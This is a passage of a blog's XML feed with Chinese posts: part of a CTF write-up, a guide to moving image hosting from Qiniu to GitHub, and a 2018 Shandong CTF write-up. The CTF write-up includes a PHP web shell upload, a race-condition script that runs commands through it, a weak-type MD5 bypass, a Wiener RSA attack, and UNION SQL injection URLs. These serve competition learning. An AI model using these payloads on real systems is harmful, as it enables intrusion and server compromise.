plain"><table><tr><td class="code"><pre><span class="line">hctf&#123;m4lb0lGe&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本次比赛让我了解到还有很多东西没有接触过或者没有完全弄懂，也有很多可惜之处、、、比如说Orderby注入，我是看过的，但是当时就是想不到，类似的例子还很多、、、</p><p>接下来的话，可能还是要继续努力啊、、现在还是菜的一批。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><strong>hideandseek</strong></p><p><a href="http://j4s0nh4ck.iteye.com/blog/2179350">软链接</a></p><p><a href="https://blog.csdn.net/li_101357/article/details/70118425">uuid 和 getnode()</a></p><p><a href="https://windard.com/blog/2017/10/17/Flask-Session">flask session</a> </p><p><strong>bootle</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a> </p><p><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html">新浪某站CRLF Injection导致的安全问题</a></p><p><strong>Game</strong></p><p><a href="https://p0sec.net/index.php/archives/106/">orderby 盲注</a>    </p><p><strong>admin</strong></p><p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> XSS </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 伪造session </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迁移七牛云图床到github</title>
      <link href="/2018/11/06/%E8%BF%81%E7%A7%BB%E4%B8%83%E7%89%9B%E4%BA%91%E5%88%B0github/"/>
      <url>/2018/11/06/%E8%BF%81%E7%A7%BB%E4%B8%83%E7%89%9B%E4%BA%91%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>七牛对域名回收了，导致我的之前所有博客的图片都需要转移，这是一件麻烦事，导致我现在对七牛非常失望。</p><p>但是，其实七牛这么做也是有自己的苦衷的，详细原因参考<a href="https://www.v2ex.com/t/476962">V2EX-[七牛云] 测试域名 测底要废除了？ 测试域名使用规范及回收机制</a> 大佬们的讨论。</p><p>算是可以理解吧，但是还是要解决问题啊。。。</p><p>开始吧。</p><h1 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h1><ol><li>下载所有图片</li><li>在github上创建图床</li><li>绑定二级域名（非必须）</li><li>将下载的图片重新上传到github图床。</li><li>利用脚本，替换所有文章的外链</li></ol><h1 id="第一步-下载所有图片"><a href="#第一步-下载所有图片" class="headerlink" title="第一步 下载所有图片"></a>第一步 下载所有图片</h1><p>使用七牛提供的 <a href="https://developer.qiniu.com/kodo/tools/1302/qshell">qshell</a> 可以很快下载所有图片。</p><p>我是 windows 环境，即下载 qshell_windows_x64.exe 。</p><p>下载完成后，现在目录下创建一个配置文件，后面会用到。(我命名为<code>qdownload,conf</code>)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;dest_dir&quot;   :   &quot;C:\\Picture\\qiniu&quot;,</span><br><span class="line">    &quot;bucket&quot;     :   &quot;ctfwp&quot;,</span><br><span class="line">    &quot;prefix&quot;     :   &quot;&quot;,</span><br><span class="line">    &quot;suffixes&quot;   :   &quot;&quot;,</span><br><span class="line">    &quot;cdn_domain&quot; :   &quot;xxxxx.bkt.clouddn.com&quot;,</span><br><span class="line">    &quot;referer&quot;    :   &quot;&#x2F;blog&quot;,</span><br><span class="line">    &quot;log_file&quot;   :   &quot;download.log&quot;,</span><br><span class="line">    &quot;log_level&quot;  :   &quot;info&quot;,</span><br><span class="line">    &quot;log_rotate&quot; :   1,</span><br><span class="line">    &quot;log_stdout&quot; :   false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要修改三个参数：</p><table><thead><tr><th>参数</th><th>内容</th></tr></thead><tbody><tr><td>“dest_dir”</td><td>下载文件保存的目录</td></tr><tr><td>“bucket”</td><td>七牛储存空间名称</td></tr><tr><td>“cdn_domain”</td><td>该储存空间的 cnd 域名</td></tr><tr><td>“referer”</td><td>存储空间的相对地址</td></tr></tbody></table><p>注：在 windows 环境中目录输入需要双斜杠。</p><p>接下来在 cmd 中输入指令即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qshell_windows_x64 account &lt;AK&gt; &lt;SK&gt; #登陆账户</span><br><span class="line">qshell_windows_x64 qdownload qdownload.conf #执行下载，qdownload,conf为刚刚写的配置文件名</span><br></pre></td></tr></table></figure><p>注：<code>&lt;AK&gt; &lt;SK&gt;</code>是自己的密钥 AccessKey 与 SecretKey，登陆七牛后，在<a href="https://portal.qiniu.com/user/key">这里</a>查看</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/qiniu_change1.png"></p><h1 id="第二步-上传图片到其他空间"><a href="#第二步-上传图片到其他空间" class="headerlink" title="第二步 上传图片到其他空间"></a>第二步 上传图片到其他空间</h1><p>这里我将图片上传都github的图床。</p><p>参考git上传的操作：<a href="https://jingyan.baidu.com/album/e52e3615192b2440c70c514b.html">如何往github上上传文件</a></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/qiniu_change2.png"></p><h1 id="第三步-将之前的博客图片外链都换成新的外链"><a href="#第三步-将之前的博客图片外链都换成新的外链" class="headerlink" title="第三步 将之前的博客图片外链都换成新的外链"></a>第三步 将之前的博客图片外链都换成新的外链</h1><p>我写了个脚本，将旧的七牛云的外链换成了新的github图床的外链</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># author: V0W</span></span><br><span class="line"><span class="comment"># env: python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># list files</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listFiles</span>(<span class="params">dirPath</span>):</span></span><br><span class="line">fileList=[]</span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(dirPath):</span><br><span class="line"><span class="keyword">for</span> fileObj <span class="keyword">in</span> files:</span><br><span class="line">fileList.append(os.path.join(root,fileObj))</span><br><span class="line"><span class="keyword">return</span> fileList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">fileDir = <span class="string">&quot;./&quot;</span></span><br><span class="line">oldstr = <span class="string">r&#x27;http://xxxxxxx.bkt.clouddn.com/&#x27;</span> <span class="comment">##这里是旧的七牛云外链</span></span><br><span class="line">newstr = <span class="string">r&#x27;https://xxxxxxxxxxxxxx/&#x27;</span>   <span class="comment">### 这个是新的图床的外链</span></span><br><span class="line">FileList = listFiles(fileDir)</span><br><span class="line"><span class="comment"># print(FileList)</span></span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> FileList:</span><br><span class="line">f = open(fname, <span class="string">&#x27;r+&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">all_the_lines=f.readlines()</span><br><span class="line"><span class="comment"># print(all_the_lines)</span></span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">f.truncate()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> all_the_lines:</span><br><span class="line">f.write(line.replace(oldstr,newstr))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>用法的话，把脚本放在博客markdown文件目录下，执行py文件即可。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://sspai.com/post/44495">https://sspai.com/post/44495</a></p><p><a href="http://k162.space/2018/10/30/qiuniu-imgs-to-github.html">http://k162.space/2018/10/30/qiuniu-imgs-to-github.html</a></p><p><a href="https://jingyan.baidu.com/album/e52e3615192b2440c70c514b.html">https://jingyan.baidu.com/album/e52e3615192b2440c70c514b.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018-科来杯-第七届山东省网络安全技能大赛WP</title>
      <link href="/2018/11/04/2018%E7%9C%81%E8%B5%9BWP/"/>
      <url>/2018/11/04/2018%E7%9C%81%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参加一波2018科来杯的山东省赛，苟了个二等奖，<code>(￣▽￣)~*</code>。就是两个题因为工具没准备好，没做出来，有点可惜，<code>web3</code>有思路，但是差一点，学习了。</p><p>我分类就不分那么细了。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h2><p>明文攻击</p><p>解压得到 <code>doc </code></p><p> 转成 <code>zip</code>，容易找到<code>flag</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/2018-11-04_00001.png"></p><h2 id="ada"><a href="#ada" class="headerlink" title="ada"></a>ada</h2><p><code>binwalk</code> 发现有压缩包</p><p><code>foremost</code>提取文件</p><p>zip  密码在属性里，这个点有点坑==、</p><p><code>hex  =&gt; str</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541296881916.png"></p><h2 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h2><p>打开文件，发现是三维数组，很明显是rgb，脚本画个图。</p><p>吐槽一下，135000个元素（非素数非平方==、）， 这个长宽，我来回换了好多次==、</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x =  <span class="number">45</span><span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y =  <span class="number">1800</span><span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">&#x27;basic.txt&#x27;</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">        line = line[<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.save(<span class="string">&#x27;res.png&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/res.png"></p><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><p>easy</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># 进制转换</span></span><br><span class="line"><span class="comment"># __author__: V0W</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;text.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">content = f.read().split()</span><br><span class="line"><span class="comment">#print content </span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">intval = int(<span class="string">&#x27;0&#x27;</span>+i,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">intval = int(<span class="string">&#x27;0&#x27;</span>+i,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;o&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">intval = int(<span class="string">&#x27;0&#x27;</span>+i,<span class="number">8</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">intval = int(i.replace(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">res += chr(intval)</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;Diversity.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> r:</span><br><span class="line">r.write(<span class="string">&quot;\n\n\n\n\n&quot;</span>)</span><br><span class="line">r.write(res)</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h2 id="CrackIt"><a href="#CrackIt" class="headerlink" title="CrackIt"></a>CrackIt</h2><p>kali中有工具<code>john</code>(这次选择题还考到的)</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541343415008.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;hellokitty&#125;</span><br></pre></td></tr></table></figure><h2 id="colors"><a href="#colors" class="headerlink" title="colors"></a>colors</h2><p>直接把每张图片再<code>StegSlove</code>里面看看，在别的通道中，容易发现提示信息<code>MakeMeTall</code></p><p>联系png图片，就是说要改图片高度。</p><p>在<code>WinHex</code>里面改一下，这里最好是改成正方形即<code>400*400=0x0190</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541343717451.png">发现每张下面都有一部分<strong>黑点</strong>像素点，可以联系<code>01二进制</code></p><p>刚好7张照片，我们知道<code>ascii码</code>的可打印字符，是7位二进制。</p><p>下面就是写个小脚本，弄一下就完事了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># __author__: V0W</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># env: python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 根据图像得到对应的01序列</span></span><br><span class="line"><span class="comment"># # 从上到下依次是0-6.png</span></span><br><span class="line"><span class="comment"># s=&#x27;&#x27;&#x27;11111111010111101111</span></span><br><span class="line"><span class="comment"># 11111011111110111111</span></span><br><span class="line"><span class="comment"># 00001100101010110001</span></span><br><span class="line"><span class="comment"># 01001010010000001101</span></span><br><span class="line"><span class="comment"># 11010011011101010111</span></span><br><span class="line"><span class="comment"># 10011011011010110110</span></span><br><span class="line"><span class="comment"># 00111001101101111101&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ls = s.split(&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment"># # print(ls)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 将序列调整一下，竖着读，竖着读，竖着读！！！</span></span><br><span class="line"><span class="comment"># for j in range(0,20):</span></span><br><span class="line"><span class="comment"># for i in ls:</span></span><br><span class="line"><span class="comment"># print(i[j],end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">num = [<span class="string">&#x27;1100110&#x27;</span>,<span class="string">&#x27;1101100&#x27;</span>,<span class="string">&#x27;1100001&#x27;</span>,<span class="string">&#x27;1100111&#x27;</span>,<span class="string">&#x27;1111011&#x27;</span>,<span class="string">&#x27;1010000&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1101110&#x27;</span>,<span class="string">&#x27;1100111&#x27;</span>,<span class="string">&#x27;0110001&#x27;</span>,<span class="string">&#x27;1101110&#x27;</span>,<span class="string">&#x27;0110111&#x27;</span>,<span class="string">&#x27;1100101&#x27;</span>,<span class="string">&#x27;1110010&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1000101&#x27;</span>,<span class="string">&#x27;1110011&#x27;</span>,<span class="string">&#x27;0110111&#x27;</span>,<span class="string">&#x27;1101001&#x27;</span>,<span class="string">&#x27;1101111&#x27;</span>,<span class="string">&#x27;1100110&#x27;</span>,<span class="string">&#x27;1111101&#x27;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> num:</span><br><span class="line">flag += chr(int(str(n),<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;运行结果</span></span><br><span class="line"><span class="string">flag&#123;Png1n7erEs7iof&#125;</span></span><br><span class="line"><span class="string">[Finished in 0.5s]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h2><p>仿射加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># a,b为y=ax+b的系数</span></span><br><span class="line"><span class="comment"># y = 17*x-8 flag&#123;szzyfimhyzd&#125;   答案格式：flag&#123;********&#125;</span></span><br><span class="line"><span class="comment"># Crypto为密文，res为明文，暴力破解得到，不用求取逆元</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">crypto = <span class="string">&quot;szzyfimhyzd&quot;</span></span><br><span class="line">a = <span class="number">17</span></span><br><span class="line">b = <span class="number">-8</span></span><br><span class="line">word = string.ascii_lowercase</span><br><span class="line"><span class="comment"># print word</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> crypto:</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> word:</span><br><span class="line"><span class="keyword">if</span> ord(c)<span class="number">-97</span> == ((ord(w)<span class="number">-97</span>)*a + b)%<span class="number">26</span>:</span><br><span class="line">res += w</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="comment"># affineshift</span></span><br></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p><em>比赛的时候没有安装好工具，很可惜（昨晚下了一半，就以为下好了，比赛才发现没有==、）</em></p><p>看到<code>e</code>特别大，容易想到<strong>高指数幂攻击</strong>或者说<strong>低解密指数攻击</strong></p><p>参考这篇<a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/">大佬的文章</a></p><p>利用这个<a href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a></p><p>payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">c = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line">n = <span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span></span><br><span class="line"></span><br><span class="line">d=hack_RSA(e,n)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.format(m).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541342936904.png"></p><h1 id="forenisc"><a href="#forenisc" class="headerlink" title="forenisc"></a>forenisc</h1><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>我没什么好办法，手撕的==、</p><p>一个技巧是：利用sublime多行编辑（<code>Ctrl+shift+L</code>）删除多余的信息</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541341109590.png"></p><p>最后，得到的<code>flag</code>的<code>ascii码</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125</span><br></pre></td></tr></table></figure><p>小jio本写一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125&#x27;</span></span><br><span class="line">ls = s.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># print ls</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">flag += chr(int(i))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h2><p>提示说特殊的协议，发现icmp中有东西 : )    </p><p>后面，每个小的数据包都有一个字节的数据，最后合起来就是flag（吐槽一下，<code>infomation</code>的拼法）</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541311067204.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Icmp_backdoor_can_transfer-some_infomation&#125;</span><br></pre></td></tr></table></figure><h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>搜索hostname，</p><p>追踪一个流，再次搜索<code>hostname</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541342204840.png"></p><p>提示hostname是十六进制，容易看到。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541311604922.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p><code>XFF+cookie</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541299516409.png"></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;here.php&#x27;</span>;</span><br><span class="line">    $key = <span class="string">&#x27;kelaibei&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        <span class="keyword">if</span> ($key[<span class="number">99</span>] != <span class="string">&#x27;aabg7XSs&#x27;</span> &amp;&amp; md5($key[<span class="number">99</span>]) == md5(<span class="string">&#x27;aabg7XSs&#x27;</span>)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> $hint;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;try again&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>@parse_str($id);</code>解析变量</p><p>php弱类型+变量覆盖</p><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.100.243:2002&#x2F;?id&#x3D;key[99]&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure><p>得到链接  <a href="http://192.168.100.243:2002/upl04d50m3thing.php">http://192.168.100.243:2002/upl04d50m3thing.php</a></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541304002941.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Filename：  qqq.php</span><br><span class="line">Content：  &lt;?php eval($_POST[&quot;v&quot;]);</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line">uploads&#x2F;e6ce11ded480d904ea8c3b30b00a23ab9bb59119&#x2F;qqq.php</span><br><span class="line"></span><br><span class="line">访问得到返回</span><br><span class="line">Tooslow</span><br></pre></td></tr></table></figure><p>容易得到结论：</p><p>后台的处理大概是: <code>file_put_content</code>，然后<code>sleep(1)</code>，<code>echo &#39;TooSlow&#39;</code></p><p>可以用条件竞争（或类似）一个脚本在这跑，然后去写shell，会在<code>post filename和content</code>瞬间访问到，</p><p>据说访问到就会返回flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.100.243:2002/uploads/e6ce11ded480d904ea8c3b30b00a23ab9bb59119/v.php&#x27;</span></span><br><span class="line"></span><br><span class="line">postdata = &#123;<span class="string">&#x27;v&#x27;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = requests.post(url,data=postdata)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541304661897.png"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><em>11-5 表哥复现了一下环境，于是复现学习一下。好题，妙啊！！</em></p><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>首先，收集一下信息：测试发现</p><p><strong>Add a Comment</strong></p><p><code>Username</code>和<code>Comment</code>都有长度限制，一旦超过长度限制，就会报错<code>Mysql Error.</code></p><p><strong>Search Comments</strong></p><p>没有长度限制，存在明显的注入点，有过滤，敏感词汇或者SQL语法错误都会报错<code>Mysql Error.</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541415880546.png"></p><h3 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2,3 #</span><br></pre></td></tr></table></figure><p>容易得到回显字段和列数（3）</p><p><em>这里非常可惜，我比赛时，用hackbar传数据，结果# 没传过去，当时以为是过滤了union和select 在那疯狂绕过啊=====、fo了，<code>#</code> urlencode传输就可以了、、哎、真菜啊</em></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/1541417483806.png"></p><p>接下来是基本操作了，直接放payload 和 结果</p><p>数据库名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2,database() %23</span><br><span class="line"></span><br><span class="line">ctf</span><br></pre></td></tr></table></figure><p>表名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.148.65:29003&#x2F;?username&#x3D;&#39; union select 1,2, group_concat(table_name) from information_schema.tables where 